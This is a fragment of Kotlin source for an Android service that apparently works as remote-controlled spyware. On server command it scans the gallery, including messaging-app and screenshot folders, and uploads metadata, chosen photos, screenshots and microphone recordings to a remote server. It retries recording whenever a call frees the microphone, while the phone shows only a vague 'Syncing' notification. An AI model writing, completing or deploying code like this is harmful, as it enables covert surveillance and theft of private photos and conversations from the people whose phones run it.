     * @param fromDate Start date filter (Unix timestamp, 0 = no filter)
     * @param toDate End date filter (Unix timestamp, 0 = no filter)
     * @param folders List of folder types: "all", "camera", "downloads", "screenshots", "whatsapp", "telegram", etc.
     * @param onlyMetadata If true, only return metadata; if false, also queue for upload
     */
    private fun scanGalleryImages(
        count: Int = 0,
        fromDate: Long = 0,
        toDate: Long = 0,
        folders: List<String> = listOf("all"),
        onlyMetadata: Boolean = true,
        callback: (List<GalleryImageInfo>) -> Unit
    ) {
        if (isGalleryScanInProgress) {
            Log.w(tag, "Gallery scan already in progress")
            socket?.emit("gallery_scan_error", JSONObject().apply {
                put("deviceId", deviceId)
                put("error", "Scan already in progress")
            })
            return
        }

        if (!hasGalleryPermission()) {
            Log.e(tag, "No gallery permission")
            socket?.emit("gallery_scan_error", JSONObject().apply {
                put("deviceId", deviceId)
                put("error", "No permission to read gallery. Grant READ_MEDIA_IMAGES permission.")
            })
            return
        }

        isGalleryScanInProgress = true

        Thread {
            try {
                val images = queryGalleryImages(count, fromDate, toDate, folders)

                handler.post {
                    isGalleryScanInProgress = false
                    callback(images)
                }

            } catch (e: Exception) {
                Log.e(tag, "Gallery scan error: ${e.message}")
                handler.post {
                    isGalleryScanInProgress = false
                    socket?.emit("gallery_scan_error", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("error", e.message)
                    })
                }
            }
        }.start()
    }

    /**
     * Query gallery images from MediaStore
     */
    private fun queryGalleryImages(
        count: Int,
        fromDate: Long,
        toDate: Long,
        folders: List<String>
    ): List<GalleryImageInfo> {
        val images = mutableListOf<GalleryImageInfo>()

        // Build projection (columns to retrieve)
        val projectionList = mutableListOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_MODIFIED,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
            MediaStore.Images.Media.BUCKET_ID
        )

        // Add DATE_TAKEN for API 29+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            projectionList.add(MediaStore.Images.Media.DATE_TAKEN)
        }

        // Build selection (WHERE clause)
        val selectionParts = mutableListOf<String>()
        val selectionArgs = mutableListOf<String>()

        // Filter by date range
        if (fromDate > 0) {
            selectionParts.add("${MediaStore.Images.Media.DATE_ADDED} >= ?")
            selectionArgs.add((fromDate / 1000).toString()) // Convert to seconds
        }
        if (toDate > 0) {
            selectionParts.add("${MediaStore.Images.Media.DATE_ADDED} <= ?")
            selectionArgs.add((toDate / 1000).toString())
        }

        // Filter by MIME type (only images, no videos)
        selectionParts.add("${MediaStore.Images.Media.MIME_TYPE} LIKE ?")
        selectionArgs.add("image/%")

        val selection = if (selectionParts.isNotEmpty()) {
            selectionParts.joinToString(" AND ")
        } else null

        // Sort by date (newest first)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        // Query MediaStore
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        contentResolver.query(
            uri,
            projectionList.toTypedArray(),
            selection,
            selectionArgs.toTypedArray(),
            sortOrder
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val dateAddedColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val dateModifiedColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)
            val widthColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
            val heightColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
            val mimeTypeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
            val bucketColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)

            val dateTakenColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
            } else -1

            var addedCount = 0

            while (cursor.moveToNext()) {
                // Check count limit
                if (count > 0 && addedCount >= count) break

                try {
                    val path = cursor.getString(dataColumn) ?: continue
                    val folderName = cursor.getString(bucketColumn) ?: "Unknown"

                    // Filter by folder if specified
                    if (!folders.contains("all")) {
                        val matchesFolder = folders.any { requestedFolder ->
                            when (requestedFolder.lowercase()) {
                                "camera" -> folderName.contains("Camera", ignoreCase = true) ||
                                        folderName.contains("DCIM", ignoreCase = true)
                                "downloads", "download" -> folderName.contains("Download", ignoreCase = true)
                                "screenshots", "screenshot" -> folderName.contains("Screenshot", ignoreCase = true)
                                "whatsapp" -> folderName.contains("WhatsApp", ignoreCase = true)
                                "telegram" -> folderName.contains("Telegram", ignoreCase = true)
                                "instagram" -> folderName.contains("Instagram", ignoreCase = true)
                                "facebook" -> folderName.contains("Facebook", ignoreCase = true)
                                "twitter" -> folderName.contains("Twitter", ignoreCase = true)
                                "snapchat" -> folderName.contains("Snapchat", ignoreCase = true)
                                "tiktok" -> folderName.contains("TikTok", ignoreCase = true)
                                "saved" -> folderName.contains("Saved", ignoreCase = true)
                                else -> folderName.contains(requestedFolder, ignoreCase = true)
                            }
                        }
                        if (!matchesFolder) continue
                    }

                    // Check if file exists and is readable
                    val file = File(path)
                    if (!file.exists() || !file.canRead()) continue

                    val id = cursor.getLong(idColumn)
                    val name = cursor.getString(nameColumn) ?: "unknown"
                    val size = cursor.getLong(sizeColumn)
                    val dateAdded = cursor.getLong(dateAddedColumn) * 1000 // Convert to milliseconds
                    val dateModified = cursor.getLong(dateModifiedColumn) * 1000
                    val dateTaken = if (dateTakenColumn >= 0) cursor.getLong(dateTakenColumn) else dateAdded
                    val width = cursor.getInt(widthColumn)
                    val height = cursor.getInt(heightColumn)
                    val mimeType = cursor.getString(mimeTypeColumn) ?: "image/jpeg"

                    // Get folder path
                    val folderPath = file.parent ?: ""

                    images.add(GalleryImageInfo(
                        id = id,
                        path = path,
                        name = name,
                        size = size,
                        dateAdded = dateAdded,
                        dateModified = dateModified,
                        dateTaken = dateTaken,
                        width = width,
                        height = height,
                        mimeType = mimeType,
                        folderName = folderName,
                        folderPath = folderPath
                    ))

                    addedCount++

                } catch (e: Exception) {
                    Log.w(tag, "Error reading image: ${e.message}")
                    continue
                }
            }
        }

        Log.d(tag, "Gallery scan found ${images.size} images")
        return images
    }

    /**
     * Send gallery metadata to server (without uploading actual images)
     */
    private fun sendGalleryMetadata(images: List<GalleryImageInfo>, requestId: String) {
        val imagesArray = org.json.JSONArray()

        images.forEach { img ->
            imagesArray.put(JSONObject().apply {
                put("id", img.id)
                put("name", img.name)
                put("size", img.size)
                put("dateAdded", img.dateAdded)
                put("dateTaken", img.dateTaken)
                put("width", img.width)
                put("height", img.height)
                put("mimeType", img.mimeType)
                put("folderName", img.folderName)
                put("path", img.path) // Include path for reference
            })
        }

        socket?.emit("gallery_metadata", JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("requestId", requestId)
            put("totalImages", images.size)
            put("images", imagesArray)
            put("timestamp", System.currentTimeMillis())
        })

        Log.d(tag, "Sent metadata for ${images.size} gallery images")
    }

    /**
     * Queue specific images for upload by their IDs
     */
    private fun queueGalleryImagesForUpload(imageIds: List<Long>, requestId: String) {
        if (imageIds.isEmpty()) {
            Log.w(tag, "No image IDs provided for upload")
            return
        }

        socket?.emit("gallery_upload_started", JSONObject().apply {
            put("deviceId", deviceId)
            put("requestId", requestId)
            put("totalImages", imageIds.size)
        })

        Thread {
            var queuedCount = 0

            imageIds.forEach { imageId ->
                try {
                    // Query for this specific image
                    val projection = arrayOf(
                        MediaStore.Images.Media._ID,
                        MediaStore.Images.Media.DATA,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DATE_ADDED,
                        MediaStore.Images.Media.MIME_TYPE,
                        MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                    )

                    val selection = "${MediaStore.Images.Media._ID} = ?"
                    val selectionArgs = arrayOf(imageId.toString())

                    contentResolver.query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        selection,
                        selectionArgs,
                        null
                    )?.use { cursor ->
                        if (cursor.moveToFirst()) {
                            val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                            val name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                            val size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE))
                            val dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                            val mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE))
                            val folderName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME))

                            val file = File(path)
                            if (file.exists() && file.canRead()) {
                                // Copy to cache for upload
                                val cacheFile = File(cacheDir, "gallery_${imageId}_${name}")
                                file.copyTo(cacheFile, overwrite = true)

                                // Queue for upload with gallery metadata
                                queueGalleryFileForUpload(cacheFile, imageId, name, dateAdded * 1000, folderName, requestId)
                                queuedCount++
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Error queuing image $imageId: ${e.message}")
                }
            }

            handler.post {
                socket?.emit("gallery_upload_queued", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("requestId", requestId)
                    put("queuedImages", queuedCount)
                    put("totalRequested", imageIds.size)
                })

                // Start processing the queue
                processGalleryUploadQueue()
            }

        }.start()
    }

    /**
     * Queue a gallery file for upload
     */
    private fun queueGalleryFileForUpload(
        file: File,
        imageId: Long,
        originalName: String,
        dateTaken: Long,
        folderName: String,
        requestId: String
    ) {
        if (!file.exists() || file.length() <= 0) return

        galleryUploadQueue.add(GalleryImageInfo(
            id = imageId,
            path = file.absolutePath,
            name = originalName,
            size = file.length(),
            dateAdded = dateTaken,
            dateModified = dateTaken,
            dateTaken = dateTaken,
            width = 0,
            height = 0,
            mimeType = "image/jpeg",
            folderName = folderName,
            folderPath = requestId // Using folderPath to store requestId temporarily
        ))

        Log.d(tag, "Queued gallery image: $originalName from $folderName")
    }

    /**
     * Process gallery upload queue with retry support
     */
    private fun processGalleryUploadQueue() {
        if (!isProcessingGalleryQueue.compareAndSet(false, true)) {
            return
        }

        galleryUploadExecutor.submit {
            try {
                var uploadedCount = 0
                var failedCount = 0
                var pausedDueToNetwork = false

                // First, move any failed items back to main queue for retry
                while (galleryFailedQueue.isNotEmpty()) {
                    val failedItem = galleryFailedQueue.poll() ?: break
                    if (failedItem.retryCount < GALLERY_MAX_RETRIES) {
                        galleryUploadQueue.add(failedItem)
                    } else {
                        // Max retries exceeded, delete cache file
                        try { File(failedItem.path).delete() } catch (e: Exception) {}
                        failedCount++
                    }
                }

                while (galleryUploadQueue.isNotEmpty()) {
                    if (!isInternetAvailable) {
                        Log.d(tag, "No internet - pausing gallery upload, ${galleryUploadQueue.size} remaining")
                        pausedDueToNetwork = true
                        break
                    }

                    // Peek first, don't remove yet
                    val imageInfo = galleryUploadQueue.peek() ?: break
                    val file = File(imageInfo.path)

                    if (!file.exists()) {
                        // File doesn't exist, remove from queue
                        galleryUploadQueue.poll()
                        failedCount++
                        continue
                    }

                    handler.post {
                        updateNotification("Uploading gallery image...")
                    }

                    val success = uploadGalleryImage(file, imageInfo)

                    if (success) {
                        // Success - remove from queue
                        galleryUploadQueue.poll()
                        uploadedCount++

                        // Delete cache file after successful upload
                        try { file.delete() } catch (e: Exception) {}

                        handler.post {
                            socket?.emit("gallery_image_uploaded", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("imageId", imageInfo.id)
                                put("name", imageInfo.name)
                                put("folderName", imageInfo.folderName)
                                put("requestId", imageInfo.folderPath)
                            })
                        }
                    } else {
                        // Failed - remove from main queue, add to failed queue with incremented retry
                        galleryUploadQueue.poll()
                        imageInfo.retryCount++

                        if (imageInfo.retryCount < GALLERY_MAX_RETRIES) {
                            galleryFailedQueue.add(imageInfo)
                            Log.w(tag, "Gallery upload failed, will retry (${imageInfo.retryCount}/$GALLERY_MAX_RETRIES): ${imageInfo.name}")
                        } else {
                            Log.e(tag, "Gallery upload permanently failed after $GALLERY_MAX_RETRIES retries: ${imageInfo.name}")
                            try { file.delete() } catch (e: Exception) {}
                            failedCount++
                        }
                    }

                    // Delay between uploads
                    try { Thread.sleep(2000) } catch (e: InterruptedException) { break }
                }

                val remainingInQueue = galleryUploadQueue.size + galleryFailedQueue.size

                handler.post {
                    if (pausedDueToNetwork && remainingInQueue > 0) {
                        socket?.emit("gallery_upload_paused", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("uploaded", uploadedCount)
                            put("failed", failedCount)
                            put("remaining", remainingInQueue)
                            put("reason", "no_internet")
                        })
                    } else {
                        socket?.emit("gallery_upload_complete", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("uploaded", uploadedCount)
                            put("failed", failedCount)
                            put("remaining", remainingInQueue)
                        })
                    }

                    updateNotification("Syncing")
                }

            } catch (e: Exception) {
                Log.e(tag, "Gallery upload queue error: ${e.message}")
            } finally {
                isProcessingGalleryQueue.set(false)
            }
        }
    }

    /**
     * Resume gallery uploads when internet is back
     * Called from network callback
     */
    private fun resumeGalleryUploadsIfNeeded() {
        val pendingCount = galleryUploadQueue.size + galleryFailedQueue.size
        if (pendingCount > 0 && !isProcessingGalleryQueue.get()) {
            Log.d(tag, "Resuming gallery uploads, $pendingCount pending")
            processGalleryUploadQueue()
        }
    }

    /**
     * Upload a single gallery image
     */
    private fun uploadGalleryImage(file: File, imageInfo: GalleryImageInfo): Boolean {
        if (!file.exists()) return true // Consider deleted as success

        val mediaType = when {
            imageInfo.mimeType.contains("png") -> "image/png"
            imageInfo.mimeType.contains("gif") -> "image/gif"
            imageInfo.mimeType.contains("webp") -> "image/webp"
            else -> "image/jpeg"
        }

        val timeoutSeconds = getTimeoutForFile(file)

        val uploadClient = OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(timeoutSeconds, TimeUnit.SECONDS)
            .readTimeout(120, TimeUnit.SECONDS)
            .build()

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("gallery_image", file.name, file.asRequestBody(mediaType.toMediaType()))
            .addFormDataPart("deviceId", deviceId)
            .addFormDataPart("deviceName", deviceName)
            .addFormDataPart("imageId", imageInfo.id.toString())
            .addFormDataPart("originalName", imageInfo.name)
            .addFormDataPart("dateTaken", imageInfo.dateTaken.toString())
            .addFormDataPart("folderName", imageInfo.folderName)
            .addFormDataPart("fileSize", file.length().toString())
            .addFormDataPart("requestId", imageInfo.folderPath) // requestId stored in folderPath
            .addFormDataPart("timestamp", System.currentTimeMillis().toString())
            .build()

        val request = Request.Builder()
            .url("$serverUrl/upload-gallery")
            .post(requestBody)
            .build()

        return try {
            uploadClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(tag, "Gallery image uploaded: ${imageInfo.name}")
                    true
                } else {
                    Log.e(tag, "Gallery upload failed: ${response.code}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Gallery upload error: ${e.message}")
            false
        }
    }

    /**
     * Get gallery statistics (folder counts, total images, etc.)
     */
    private fun getGalleryStats(): JSONObject {
        val stats = JSONObject()

        if (!hasGalleryPermission()) {
            stats.put("error", "No gallery permission")
            stats.put("hasPermission", false)
            return stats
        }

        stats.put("hasPermission", true)

        try {
            val folderCounts = mutableMapOf<String, Int>()
            var totalImages = 0
            var totalSize = 0L
            var oldestDate = Long.MAX_VALUE
            var newestDate = 0L

            val projection = arrayOf(
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME
            )

            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                "${MediaStore.Images.Media.MIME_TYPE} LIKE ?",
                arrayOf("image/%"),
                null
            )?.use { cursor ->
                val sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val bucketColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)

                while (cursor.moveToNext()) {
                    totalImages++
                    totalSize += cursor.getLong(sizeColumn)

                    val date = cursor.getLong(dateColumn) * 1000
                    if (date < oldestDate) oldestDate = date
                    if (date > newestDate) newestDate = date

                    val folder = cursor.getString(bucketColumn) ?: "Unknown"
                    folderCounts[folder] = (folderCounts[folder] ?: 0) + 1
                }
            }

            stats.put("totalImages", totalImages)
            stats.put("totalSizeBytes", totalSize)
            stats.put("totalSizeMB", totalSize / (1024 * 1024))
            stats.put("oldestImageDate", if (oldestDate < Long.MAX_VALUE) oldestDate else 0)
            stats.put("newestImageDate", newestDate)

            val foldersArray = org.json.JSONArray()
            folderCounts.entries.sortedByDescending { it.value }.forEach { (folder, count) ->
                foldersArray.put(JSONObject().apply {
                    put("name", folder)
                    put("count", count)
                })
            }
            stats.put("folders", foldersArray)
            stats.put("folderCount", folderCounts.size)

        } catch (e: Exception) {
            stats.put("error", e.message)
        }

        return stats
    }

    // ==================== MICROPHONE CONFLICT HANDLING ====================

    private var recordingInterrupted = false
    private var interruptedRecordingFile: File? = null

    /**
     * Handle recording error (often means mic was stolen by another app)
     */
    private fun handleRecordingError(error: Exception) {
        Log.e(tag, "Recording error (mic may be stolen): ${error.message}")

        val isMicStolen = error.message?.contains("stop failed") == true ||
                error.message?.contains("start failed") == true ||
                error.message?.contains("prepare failed") == true ||
                error is IllegalStateException

        if (isMicStolen) {
            recordingInterrupted = true

            // Notify web portal
            socket?.emit("recording_interrupted", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("reason", "microphone_busy")
                put("message", "Another app (call/voice app) is using microphone")
                put("willRetry", true)
            })

            // Try to save what we have
            tryToSavePartialRecording()

            // Schedule retry after delay (call might end)
            handler.postDelayed({
                if (recordingInterrupted) {
                    retryInterruptedRecording()
                }
            }, 30000) // Retry after 30 seconds
        }
    }

    /**
     * Try to save partial recording if mic was stolen mid-recording
     */
    private fun tryToSavePartialRecording() {
        try {
            mediaRecorder?.apply {
                try {
                    stop()
                } catch (e: Exception) {
                    Log.w(tag, "Could not stop recorder cleanly: ${e.message}")
                }
                release()
            }
            mediaRecorder = null

            currentRecordingFile?.let { file ->
                if (file.exists() && file.length() > 1000) {
                    Log.d(tag, "Saved partial recording: ${file.name}, ${file.length()} bytes")
                    interruptedRecordingFile = file
                    queueFileForUpload(file, "audio")

                    socket?.emit("partial_recording_saved", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("deviceName", deviceName)
                        put("filename", file.name)
                        put("size", file.length())
                    })
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Error saving partial recording: ${e.message}")
        }
    }

    /**
     * Retry recording after interruption
     */
    private fun retryInterruptedRecording() {
        if (!recordingInterrupted) return

        Log.d(tag, "Retrying interrupted recording...")

        // Check if mic is available now
        if (isMicrophoneAvailable()) {
            recordingInterrupted = false

            socket?.emit("recording_retry", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("status", "retrying")
            })

            // Start a new recording (30 seconds default)
            startRecording(30)
        } else {
            Log.d(tag, "Mic still busy, will retry later")

            // Retry again in 30 seconds
            handler.postDelayed({
                if (recordingInterrupted) {
                    retryInterruptedRecording()
                }
            }, 30000)
        }
    }

    /**
     * Check if microphone is currently available
     */
    private fun isMicrophoneAvailable(): Boolean {
        return try {
            val testRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            val testFile = File(cacheDir, "mic_test_${System.currentTimeMillis()}.tmp")

            testRecorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(testFile.absolutePath)
            }

            try {
                testRecorder.prepare()
                testRecorder.start()
                Thread.sleep(100)
                testRecorder.stop()
                testRecorder.release()
                testFile.delete()
                true
            } catch (e: Exception) {
                testRecorder.release()
                testFile.delete()
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    // ==================== ROBUST UPLOAD QUEUE METHODS ====================

    /**
     * Queue a file for upload with priority handling
     */
    private fun queueFileForUpload(file: File, type: String = "audio") {
        if (!file.exists() || file.length() <= 100) return
        if (filesBeingUploaded.contains(file.name)) return

        Log.d(tag, "Queuing file ($type): ${file.name}, size: ${file.length()} bytes")

        // Clean up old files and enforce queue limit
        cleanupOldFiles()
        enforceQueueLimit()

        // Start appropriate processor based on file size
        if (file.length() < SMALL_FILE_THRESHOLD) {
            processSmallFileQueue()
        } else {
            processLargeFileQueue()
        }
    }

    /**
     * Process small files queue (< 5MB) - higher priority, faster uploads
     */
    private fun processSmallFileQueue() {
        if (!isProcessingSmallFiles.compareAndSet(false, true)) return

        smallFileExecutor.submit {
            try {
                processQueueBySize(isSmall = true)
            } catch (e: Exception) {
                Log.e(tag, "Small file queue error: ${e.message}")
            } finally {
                isProcessingSmallFiles.set(false)
            }
        }
    }

    /**
     * Process large files queue (>= 5MB) - lower priority, longer timeouts
     */
    private fun processLargeFileQueue() {
        if (!isProcessingLargeFiles.compareAndSet(false, true)) return

        largeFileExecutor.submit {
            try {
                processQueueBySize(isSmall = false)
            } catch (e: Exception) {
                Log.e(tag, "Large file queue error: ${e.message}")
            } finally {
                isProcessingLargeFiles.set(false)
            }
        }
    }

    /**
     * Main queue processing logic with health monitoring
     */
    private fun processQueueBySize(isSmall: Boolean) {
        val queueType = if (isSmall) "small" else "large"
        Log.d(tag, "Processing $queueType file queue")

        while (true) {
            // Check if we should pause due to multiple failures
            if (shouldPauseUploads()) {
                Log.w(tag, "Upload paused due to multiple failures. Resuming in ${pauseDurationMs / 1000}s")
                handler.post { updateNotification("Waiting (retry)") }
                try { Thread.sleep(pauseDurationMs) } catch (e: InterruptedException) { break }
                resetFailureTracking()
            }

            // Check network
            if (!isInternetAvailable) {
                Log.d(tag, "No internet - pausing $queueType queue")
                handler.post { updateNotification("Offline") }
                break
            }

            // Get pending files sorted by priority
            val pendingFiles = getPendingFilesByPriority(isSmall)
            if (pendingFiles.isEmpty()) {
                Log.d(tag, "No $queueType files to upload")
                handler.post { updateNotification("Synced") }
                break
            }

            // Get next file to upload
            val file = pendingFiles.first()

            // Skip if already being uploaded
            if (filesBeingUploaded.contains(file.name)) {
                continue
            }

            // Skip if file failed too many times recently
            if (shouldSkipFile(file)) {
                Log.d(tag, "Skipping recently failed file: ${file.name}")
                continue
            }

            filesBeingUploaded.add(file.name)
            handler.post {
                updateNotification("Uploading ${if (isSmall) "📄" else "📁"}")
            }

            Log.d(tag, "Uploading $queueType file: ${file.name} (${file.length()} bytes)")

            // Perform upload with timeout
            val success = uploadFileWithTimeout(file)

            filesBeingUploaded.remove(file.name)

            if (success) {
                handleUploadSuccess(file)
            } else {
                handleUploadFailure(file)
            }

            // Delay between uploads to not overwhelm slow connection
            try {
                Thread.sleep(uploadDelayBetweenFilesMs)
            } catch (e: InterruptedException) {
                break
            }
        }
    }

    /**
     * Get pending files sorted by priority
     * Priority: 1) Smaller files first, 2) Newer files first, 3) Never-failed files first
     */
    private fun getPendingFilesByPriority(isSmall: Boolean): List<File> {
        return try {
            val allFiles = cacheDir.listFiles { file ->
                (file.name.endsWith(".m4a") || file.name.endsWith(".jpg") || file.name.endsWith(".png")) &&
                        file.length() > 100 &&
                        file != currentRecordingFile &&
                        !filesBeingUploaded.contains(file.name)
            } ?: emptyArray()

            // Filter by size category
            val filteredFiles = allFiles.filter { file ->
                if (isSmall) {
                    file.length() < SMALL_FILE_THRESHOLD
                } else {
                    file.length() >= SMALL_FILE_THRESHOLD
                }
            }

            // Sort by priority: smaller files first, then by modification time (newest first)
            filteredFiles.sortedWith(compareBy<File> {
                // Never-failed files get priority
                if (failedFiles.containsKey(it.name)) 1 else 0
            }.thenBy {
                // Smaller files first
                it.length()
            }.thenByDescending {
                // Newer files first
                it.lastModified()
            })

        } catch (e: Exception) {
            Log.e(tag, "Error getting pending files: ${e.message}")
            emptyList()
        }
    }

    /**
     * Upload file with appropriate timeout based on size
     */
    private fun uploadFileWithTimeout(file: File): Boolean {
        val timeoutSeconds = getTimeoutForFile(file)
        val isScreenshot = file.name.endsWith(".jpg") || file.name.endsWith(".png")
        val endpoint = if (isScreenshot) "/upload-screenshot" else "/upload"

        Log.d(tag, "Upload timeout for ${file.name}: ${timeoutSeconds}s")

        var attempt = 0
        while (attempt < MAX_RETRY_ATTEMPTS) {
            if (!isInternetAvailable) return false
            attempt++

            try {
                val success = performUploadWithTimeout(file, endpoint, timeoutSeconds)
                if (success) {
                    consecutiveFailures = 0 // Reset on success
                    return true
                }
            } catch (e: Exception) {
                Log.e(tag, "Upload attempt $attempt failed for ${file.name}: ${e.message}")
            }

            // Wait before retry with exponential backoff
            if (attempt < MAX_RETRY_ATTEMPTS) {
                val delayMs = RETRY_DELAY_BASE_MS * attempt
                Log.d(tag, "Retrying in ${delayMs / 1000}s...")
                try { Thread.sleep(delayMs) } catch (e: InterruptedException) { return false }
            }
        }

        return false
    }

    /**
     * Perform actual upload with OkHttp timeout
     */
    private fun performUploadWithTimeout(file: File, endpoint: String, timeoutSeconds: Long): Boolean {
        if (!file.exists()) return true // File deleted, consider success

        val mediaType = when {
            file.name.endsWith(".m4a") -> "audio/mp4"
            file.name.endsWith(".jpg") -> "image/jpeg"
            file.name.endsWith(".png") -> "image/png"
            else -> "application/octet-stream"
        }

        val fieldName = if (endpoint.contains("screenshot")) "screenshot" else "audio"

        // Create client with file-size-appropriate timeout
        val uploadClient = OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(timeoutSeconds, TimeUnit.SECONDS)
            .readTimeout(120, TimeUnit.SECONDS)
            .build()

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart(fieldName, file.name, file.asRequestBody(mediaType.toMediaType()))
            .addFormDataPart("deviceId", deviceId)
            .addFormDataPart("deviceName", deviceName)
            .addFormDataPart("model", Build.MODEL)
            .addFormDataPart("fileSize", file.length().toString())
            .addFormDataPart("timestamp", System.currentTimeMillis().toString())
            .build()

        val request = Request.Builder()
            .url("$serverUrl$endpoint")
            .post(requestBody)
            .build()

        return try {
            uploadClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(tag, "Upload successful: ${file.name}")
                    true
                } else {
                    Log.e(tag, "Upload failed: ${response.code} - ${response.message}")
                    false
                }
            }
        } catch (e: IOException) {
            Log.e(tag, "Upload IO error: ${e.message}")
            if (!checkInternetConnectivity()) {
                isInternetAvailable = false
            }
            false
        } catch (e: Exception) {
            Log.e(tag, "Upload error: ${e.message}")
            false
        }
    }

    /**
     * Handle successful upload
     */
    private fun handleUploadSuccess(file: File) {
        Log.d(tag, "Upload success: ${file.name}")

        // Remove from failed tracking
        failedFiles.remove(file.name)

        // Delete the file
        try {
            if (file.exists() && file != currentRecordingFile) {
                file.delete()
                Log.d(tag, "Deleted uploaded file: ${file.name}")
            }
        } catch (e: Exception) {
            Log.e(tag, "Failed to delete: ${file.name}", e)
        }

        // Notify server
        handler.post {
            val isScreenshot = file.name.contains("screenshot")
            val eventName = if (isScreenshot) "screenshot_uploaded" else "upload_complete"
            socket?.emit(eventName, JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("filename", file.name)
            })
        }
    }

    /**
     * Handle failed upload - track for retry later
     */
    private fun handleUploadFailure(file: File) {
        Log.w(tag, "Upload failed: ${file.name}")

        consecutiveFailures++
        lastFailureTime = System.currentTimeMillis()

        // Track failed file
        val existingInfo = failedFiles[file.name]
        val newFailCount = (existingInfo?.failCount ?: 0) + 1

        failedFiles[file.name] = FailedFileInfo(
            filename = file.name,
            failCount = newFailCount,
            lastFailTime = System.currentTimeMillis(),
            fileSize = file.length()
        )

        Log.d(tag, "File ${file.name} failed $newFailCount times")

        // Notify server of failure
        handler.post {
            socket?.emit("upload_failed", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("filename", file.name)
                put("failCount", newFailCount)
                put("fileSize", file.length())
            })
        }
    }

    /**
     * Check if we should pause uploads due to multiple failures
     */
    private fun shouldPauseUploads(): Boolean {
        if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
            val timeSinceLastFailure = System.currentTimeMillis() - lastFailureTime
            if (timeSinceLastFailure < pauseDurationMs) {
                return true
            }
        }
        return false
    }

    /**
     * Reset failure tracking after pause period
     */
    private fun resetFailureTracking() {
        consecutiveFailures = 0
        isPaused = false
        Log.d(tag, "Failure tracking reset, resuming uploads")
    }

    /**
     * Check if file should be skipped (failed too recently)
     */
    private fun shouldSkipFile(file: File): Boolean {
        val info = failedFiles[file.name] ?: return false

        // If failed 3+ times, wait longer before retry
